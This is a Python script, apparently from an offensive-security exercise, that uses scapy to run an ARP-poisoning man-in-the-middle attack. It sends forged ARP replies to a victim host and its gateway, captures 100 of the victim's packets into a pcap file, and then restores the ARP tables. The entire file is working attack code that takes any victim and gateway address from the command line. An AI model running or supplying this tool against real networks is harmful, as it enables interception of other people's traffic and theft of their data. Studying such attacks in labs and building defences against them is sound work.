from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                        send, sniff, sndrcv, srp, wrpcap)

import os
import sys
import time

# retrieve the MAC address for a given IP
def get_mac(targetip):
    # pass targetip and create ARP request packet
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=targetip)
    # send the packet and get the response on network layer 2
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _,  r in resp:
        return r[Ether].src
    return None

class Arper:
    # debian interface naming convention ens33
    def __init__(self, victim, gateway, interface='eth0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f'Initialized {interface}:')
        print(f'Gateway {gateway} is at {self.gatewaymac}')
        print(f'Victim {victim} is at {self.victimmac}')
        print('-'*30)
    
    # attack entry point
    def run(self):
        # poisoning and sniffing run in parallel processes
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()
    
    # ARP poisoning method
    def poison(self):
        # create poisoned ARP packet for victim, gateway IP mapped to attacker MAC
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)
        # create poisoned ARP packet for gateway, victim IP mapped to attacker MAC
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')
        # continuously send the poisoned ARP packets to victim and gateway
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            # exit loop and restore network information for victim and gateway
            except KeyboardInterrupt:
                self.restore()
                sys.exit(0)
            else:
                time.sleep(2)
    # sniffing method
    def sniff(self, count=100):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        # filter for packets containing victim IP
        bpf_filter = "ip host %s" % victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        # write the captured packets to arper.pcap
        wrpcap('arper.pcap', packets)
        print('Retrieved packets.')
        # restore ARP tables to original values
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')
    # restore the network to its original state
    def restore(self):
        print('Restoring ARP tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            pdst=self.victim,
            hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=self.gatewaymac
        ), count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            pdst=self.gateway,
            hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=self.victimmac
        ), count=5)

if __name__ == '__main__':
    (victim, gateway, interface) = sys.argv[1], sys.argv[2], sys.argv[3]
    myarp = Arper(victim, gateway, interface)
    myarp.run()

